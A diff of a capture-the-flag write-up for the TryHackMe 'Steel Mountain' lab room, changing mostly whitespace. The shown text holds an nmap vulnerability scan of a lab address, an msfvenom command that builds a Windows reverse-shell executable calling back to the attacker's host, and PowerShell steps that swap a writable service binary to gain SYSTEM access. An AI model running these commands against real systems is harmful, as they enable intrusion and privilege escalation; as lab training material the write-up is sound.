@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2021-11-07-tryhackme-complete-be
 author: 100007
 ---
 
-# TryHackMe: Complete Beginner
-
-**author:** Nathan Acks  
-**date:** 2021-11-07
-
 # Steel Mountain
 
 ## Introduction
@@ -25,7 +20,7 @@ NMAP command line (note that we skip the ping test, since Windows machines donâ€
 
 ```
 sudo nmap -v -oA steel-mountain -A -Pn -sS \
---script vuln -p- 10.10.241.108
+          --script vuln -p- 10.10.241.108
 ```
 
 Results:
@@ -45,7 +40,7 @@ PORT STATE SERVICE VERSION
 139/tcp open netbios-ssn Microsoft Windows netbios-ssn
 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
 3389/tcp open ssl/ms-wbt-server?
-| ssl-dh-params:
+| ssl-dh-params: 
 | VULNERABLE:
 | Diffie-Hellman Key Exchange Insufficient Group Strength
 | State: VULNERABLE
@@ -68,51 +63,51 @@ PORT STATE SERVICE VERSION
 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
 |_http-server-header: Microsoft-HTTPAPI/2.0
 8080/tcp open http HttpFileServer httpd 2.3
-| vulners:
-| cpe:/a:rejetto:httpfileserver:2.3:
-| 1337DAY-ID-35849 10.0 https://vulners.com/zdt/1337DAY-ID-35849 *EXPLOIT*
-| SECURITYVULNS:VULN:14023 7.5 https://vulners.com/securityvulns/SECURITYVULNS:VULN:14023
-| PACKETSTORM:161503 7.5 https://vulners.com/packetstorm/PACKETSTORM:161503 *EXPLOIT*
-| PACKETSTORM:160264 7.5 https://vulners.com/packetstorm/PACKETSTORM:160264 *EXPLOIT*
-| PACKETSTORM:135122 7.5 https://vulners.com/packetstorm/PACKETSTORM:135122 *EXPLOIT*
-| PACKETSTORM:128593 7.5 https://vulners.com/packetstorm/PACKETSTORM:128593 *EXPLOIT*
-| PACKETSTORM:128243 7.5 https://vulners.com/packetstorm/PACKETSTORM:128243 *EXPLOIT*
-| MSF:EXPLOIT/WINDOWS/HTTP/REJETTO_HFS_EXEC 7.5 https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/HTTP/REJETTO_HFS_EXEC *EXPLOIT*
-| EXPLOITPACK:A6E51CB06A5AB6562CC6D5A235ECDE13 7.5 https://vulners.com/exploitpack/EXPLOITPACK:A6E51CB06A5AB6562CC6D5A235ECDE13 *EXPLOIT*
-| EXPLOITPACK:A39709063C426496F984E8852560BBFF 7.5 https://vulners.com/exploitpack/EXPLOITPACK:A39709063C426496F984E8852560BBFF *EXPLOIT*
-| EDB-ID:49584 7.5 https://vulners.com/exploitdb/EDB-ID:49584 *EXPLOIT*
-| EDB-ID:49125 7.5 https://vulners.com/exploitdb/EDB-ID:49125 *EXPLOIT*
-| EDB-ID:39161 7.5 https://vulners.com/exploitdb/EDB-ID:39161 *EXPLOIT*
-| EDB-ID:34926 7.5 https://vulners.com/exploitdb/EDB-ID:34926 *EXPLOIT*
-| EDB-ID:34668 7.5 https://vulners.com/exploitdb/EDB-ID:34668 *EXPLOIT*
-| 1337DAY-ID-25379 7.5 https://vulners.com/zdt/1337DAY-ID-25379 *EXPLOIT*
-| 1337DAY-ID-22733 7.5 https://vulners.com/zdt/1337DAY-ID-22733 *EXPLOIT*
-| 1337DAY-ID-22640 7.5 https://vulners.com/zdt/1337DAY-ID-22640 *EXPLOIT*
-|_ 1337DAY-ID-6287 0.0 https://vulners.com/zdt/1337DAY-ID-6287 *EXPLOIT*
+| vulners: 
+| cpe:/a:rejetto:httpfileserver:2.3: 
+| 1337DAY-ID-35849	10.0	https://vulners.com/zdt/1337DAY-ID-35849	*EXPLOIT*
+| SECURITYVULNS:VULN:14023	7.5	https://vulners.com/securityvulns/SECURITYVULNS:VULN:14023
+| PACKETSTORM:161503	7.5	https://vulners.com/packetstorm/PACKETSTORM:161503	*EXPLOIT*
+| PACKETSTORM:160264	7.5	https://vulners.com/packetstorm/PACKETSTORM:160264	*EXPLOIT*
+| PACKETSTORM:135122	7.5	https://vulners.com/packetstorm/PACKETSTORM:135122	*EXPLOIT*
+| PACKETSTORM:128593	7.5	https://vulners.com/packetstorm/PACKETSTORM:128593	*EXPLOIT*
+| PACKETSTORM:128243	7.5	https://vulners.com/packetstorm/PACKETSTORM:128243	*EXPLOIT*
+| MSF:EXPLOIT/WINDOWS/HTTP/REJETTO_HFS_EXEC	7.5	https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/HTTP/REJETTO_HFS_EXEC	*EXPLOIT*
+| EXPLOITPACK:A6E51CB06A5AB6562CC6D5A235ECDE13	7.5	https://vulners.com/exploitpack/EXPLOITPACK:A6E51CB06A5AB6562CC6D5A235ECDE13	*EXPLOIT*
+| EXPLOITPACK:A39709063C426496F984E8852560BBFF	7.5	https://vulners.com/exploitpack/EXPLOITPACK:A39709063C426496F984E8852560BBFF	*EXPLOIT*
+| EDB-ID:49584	7.5	https://vulners.com/exploitdb/EDB-ID:49584	*EXPLOIT*
+| EDB-ID:49125	7.5	https://vulners.com/exploitdb/EDB-ID:49125	*EXPLOIT*
+| EDB-ID:39161	7.5	https://vulners.com/exploitdb/EDB-ID:39161	*EXPLOIT*
+| EDB-ID:34926	7.5	https://vulners.com/exploitdb/EDB-ID:34926	*EXPLOIT*
+| EDB-ID:34668	7.5	https://vulners.com/exploitdb/EDB-ID:34668	*EXPLOIT*
+| 1337DAY-ID-25379	7.5	https://vulners.com/zdt/1337DAY-ID-25379	*EXPLOIT*
+| 1337DAY-ID-22733	7.5	https://vulners.com/zdt/1337DAY-ID-22733	*EXPLOIT*
+| 1337DAY-ID-22640	7.5	https://vulners.com/zdt/1337DAY-ID-22640	*EXPLOIT*
+|_ 1337DAY-ID-6287	0.0	https://vulners.com/zdt/1337DAY-ID-6287	*EXPLOIT*
 |_http-csrf: Couldn't find any CSRF vulnerabilities.
 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
-| http-method-tamper:
+| http-method-tamper: 
 | VULNERABLE:
 | Authentication bypass by HTTP verb tampering
 | State: VULNERABLE (Exploitable)
 | This web server contains password protected resources vulnerable to authentication bypass
 | vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
 | common HTTP methods and in misconfigured .htaccess files.
-|
+|              
 | Extra information:
-|
+|       
 | URIs suspected to be vulnerable to HTTP verb tampering:
 | /~login [GENERIC]
-|
+|   
 | References:
 | http://capec.mitre.org/data/definitions/274.html
 | https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
 | http://www.mkit.com.ar/labs/htexploit/
 |_ http://www.imperva.com/resources/glossary/http_verb_tampering.html
-| http-fileupload-exploiter:
-|
+| http-fileupload-exploiter: 
+|   
 |_ Couldn't find a file-type field.
-| http-vuln-cve2011-3192:
+| http-vuln-cve2011-3192: 
 | VULNERABLE:
 | Apache byterange filter DoS
 | State: VULNERABLE
@@ -152,20 +147,24 @@ OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=8
 OS:0%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%
 OS:Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
 OS:Y%DFI=N%T=80%CD=Z)
+
 Uptime guess: 0.119 days (since Sun Nov 7 14:17:42 2021)
 Network Distance: 4 hops
 TCP Sequence Prediction: Difficulty=264 (Good luck!)
 IP ID Sequence Generation: Incremental
 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
 Host script results:
 |_smb-vuln-ms10-061: No accounts left to try
 |_smb-vuln-ms10-054: false
 |_samba-vuln-cve-2012-1182: No accounts left to try
+
 TRACEROUTE (using port 1723/tcp)
 HOP RTT ADDRESS
 1 33.91 ms 10.13.0.1
 2 ... 3
 4 174.12 ms 10.10.241.108
+
 Read data files from: /usr/bin/../share/nmap
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sun Nov 7 17:08:26 2021 -- 1 IP address (1 host up) scanned in 1444.56 seconds
@@ -216,8 +215,8 @@ For whatever reason, the room lists the wrong msfvenom command. To generate the 
 
 ```
 msfvenom -p windows/shell_reverse_tcp \
-LHOST=10.13.26.40 LPORT=4443 \
--e x86/shikata_ga_nai -f exe -o ASCService.exe
+            LHOST=10.13.26.40 LPORT=4443 \
+         -e x86/shikata_ga_nai -f exe -o ASCService.exe
 ```
 
 (The reason we need to specify an encoder here is because the vulnerable binary is in Program Files (x86), so we need to produce an x86 binary rather than the default x86\_64 binary.)
@@ -234,9 +233,9 @@ Replace the ASCService.exe binary (its permissions are such that we can do this)
 ```
 Stop-Service -Name AdvancedSystemCareService9
 cp "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
-ASCService.exe.bak
+   ASCService.exe.bak
 cp -force ASCService.exe
-"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+   "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
 Start-Service -Name AdvancedSystemCareService9
 ```
 
@@ -253,7 +252,7 @@ Once we have the root flag, letâ€™s put the service back the way it was before w
 ```
 Stop-Service -Name AdvancedSystemCareService9
 cp -force ASCService.exe.bak
-"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+   "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
 Start-Service -Name AdvancedSystemCareService9
 ```
 
